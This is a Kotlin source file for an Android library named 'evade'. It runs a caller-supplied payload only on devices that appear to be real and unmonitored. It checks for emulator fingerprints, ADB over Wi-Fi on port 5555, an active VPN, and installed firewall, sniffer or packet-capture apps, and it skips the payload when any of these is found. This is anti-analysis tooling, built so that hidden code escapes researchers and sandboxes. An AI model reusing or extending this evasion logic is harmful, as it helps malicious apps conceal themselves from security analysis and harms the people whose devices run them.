package com.deafo.evade

import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageInfo
import android.content.pm.PackageManager
import android.hardware.usb.UsbManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.util.Log
import androidx.annotation.RequiresApi
import kotlinx.coroutines.Deferred
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.async
import kotlinx.coroutines.withContext
import java.net.InetAddress
import java.net.UnknownHostException
import java.util.*
import javax.net.SocketFactory


@ExperimentalStdlibApi
suspend inline fun Context.evade(
    requiresNetwork: Boolean = true,
    crossinline payload: suspend () -> Unit
): OnEvade.Escape? {
    return withContext(Dispatchers.Default) {
        val isEmulator = async { isEmulator }
        val hasAdbOverWifi = async { hasAdbOverWifi() }
        val isConnected = async { isConnected() }
        val hasUsbDevices = async { hasUsbDevices() }
        var hasFirewall: Deferred<Boolean>? = null
        var hasVpn: Deferred<Boolean>? = null
        if (requiresNetwork) {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R)
                hasFirewall = async { hasFirewall() }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP)
                hasVpn = async { hasVPN() }
        }
        val evaded = (!isEmulator.await() && !hasAdbOverWifi.await() && !(hasVpn?.await()
            ?: false) && !(hasFirewall?.await() ?: false))
        if (evaded) {
            payload()
            return@withContext null
        } else {
            return@withContext OnEvade.Escape(evaded)
        }
    }
}

class OnEvade {
    class Success(val result: Boolean) : Result {
        suspend fun onSuccess(callback: suspend () -> Unit): Escape {
            if (!this.result)
                callback()
            return Escape(this.result)
        }
    }

    class Escape(val result: Boolean) : Result {
        suspend fun onEscape(callback: suspend () -> Unit): Success {
            if (this.result)
                callback()
            return Success(this.result)
        }
    }
}

interface Result

/*Checks whether this phone is connected to a usb device such as a computer. I do not know whether this works but I believe it won't hurt to check*/
@RequiresApi(Build.VERSION_CODES.HONEYCOMB_MR1)
@PublishedApi
internal suspend fun Context.hasUsbDevices() = (
        this.getSystemService(Context.USB_SERVICE) as UsbManager).deviceList.isNotEmpty()

/*Checks whether the app is running on a fake device*/
@PublishedApi
internal val isEmulator by lazy {
    (Build.DEVICE.contains("generic")
            || Build.FINGERPRINT.contains("generic")
            || Build.MODEL.contains("google_sdk")
            || Build.MODEL.contains("Emulator")
            || Build.MODEL.contains("Android SDK built for x86")
            || Build.BOARD == "QC_Reference_Phone"
            || Build.MANUFACTURER.contains("Genymotion")
            || Build.HOST.startsWith("Build") //MSI App Player
            || (Build.BRAND.startsWith("generic") || Build.DEVICE.startsWith("generic"))
            || Build.HARDWARE.contains("goldfish")
            || Build.HARDWARE.contains("ranchu")
            || Build.PRODUCT.contains("sdk_google")
            || Build.PRODUCT.contains("google_sdk")
            || Build.PRODUCT.contains("full_x86")
            || Build.PRODUCT.contains("sdk")
            || Build.PRODUCT.contains("sdk_x86")
            || Build.PRODUCT.contains("vbox86p")
            || Build.PRODUCT.contains("emulator")
            || Build.PRODUCT.contains("simulator"))
}

/*checks whether the device has a firewall or networking utilities app installed.*/
@PublishedApi
internal suspend fun Context.hasFirewall(): Boolean {
    lateinit var packages: List<PackageInfo>
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N)
        packages =
            this.packageManager.getInstalledPackages(PackageManager.MATCH_UNINSTALLED_PACKAGES)
    else
        packages = this.packageManager.getInstalledPackages(PackageManager.GET_UNINSTALLED_PACKAGES)
    packages.forEach { app ->
        val name = app.packageName.lowercase(Locale.getDefault())
        if (name.contains("firewall") || name.contains("adb")
            || name.contains("port scanner") || name.contains("network scanner")
            || name.contains("network analysis") || name.contains("ip tools")
            || name.contains("net scan") || name.contains("network analyzer")
            || name.contains("packet capture") || name.contains("pcap") || name.contains("wicap")
            || name.contains("netcapture") || name.contains("sniffer") || name.contains("vnet") || name.contains(
                "network log"
            ) ||
            name.contains("network monitor") || name.contains("network tools") || name.contains("network utilities") || name.contains(
                "network utility"
            )
        )
            return true
    }
    return false
}

/*Checks whether the device is listening to port 5555. This port is used to connect to a computer through wifi on a local network for ADB debugging*/
@PublishedApi
internal suspend fun Context.hasAdbOverWifi(): Boolean {
    var isOpen = false
    val mgr = this.getSystemService(Context.WIFI_SERVICE) as WifiManager
    if (!mgr.isWifiEnabled)
        return isOpen
    val wifiAddress = this.applicationContext.getWifiIpAddress(mgr)
    runCatching {
        SocketFactory.getDefault().createSocket(wifiAddress, 5555).close()
        isOpen = true
    }
    return isOpen
}

/*checks whether the network is running through a VPN*/
@RequiresApi(Build.VERSION_CODES.LOLLIPOP)
@PublishedApi
internal suspend fun Context.hasVPN(): Boolean {
    val mgr = this.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
    mgr.allNetworks.forEach { network ->
        val capabilities = mgr.getNetworkCapabilities(network)
        if (capabilities!!.hasTransport(NetworkCapabilities.TRANSPORT_VPN))
            return true
    }
    return false
}


/*checks whether there is a usb cord plugged into the phone*/
@PublishedApi
internal suspend fun Context.isConnected(): Boolean {
    val intent = this.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
    val plugged = intent!!.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1)
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1)
        return plugged == BatteryManager.BATTERY_PLUGGED_AC || plugged == BatteryManager.BATTERY_PLUGGED_USB || plugged == BatteryManager.BATTERY_PLUGGED_WIRELESS
    return plugged == BatteryManager.BATTERY_PLUGGED_AC || plugged == BatteryManager.BATTERY_PLUGGED_USB
}

private suspend fun Context.getWifiIpAddress(wifiManager: WifiManager): String? {
    val intRepresentation = wifiManager.dhcpInfo.ipAddress
    val addr = intToInetAddress(intRepresentation)
    return addr?.hostAddress
}

private suspend fun intToInetAddress(hostAddress: Int): InetAddress? {
    val addressBytes = byteArrayOf(
        (0xff and hostAddress).toByte(),
        (0xff and (hostAddress shr 8)).toByte(),
        (0xff and (hostAddress shr 16)).toByte(),
        (0xff and (hostAddress shr 24)).toByte()
    )
    return try {
        InetAddress.getByAddress(addressBytes)
    } catch (e: UnknownHostException) {
        throw AssertionError()
    }
}